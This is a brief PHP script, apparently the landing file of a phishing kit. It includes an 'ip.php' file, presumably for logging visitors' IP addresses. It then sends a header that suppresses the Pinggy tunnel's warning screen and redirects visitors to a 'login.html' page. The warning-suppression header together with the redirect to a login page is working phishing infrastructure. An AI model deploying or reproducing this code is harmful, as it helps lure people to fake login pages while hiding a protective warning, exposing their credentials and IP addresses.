<?php
include 'ip.php';

// Add the Pinggy header BEFORE redirect
header("X-Pinggy-No-Screen: 1");

// Redirect to the login page
header('Location: login.html');
exit;
?>
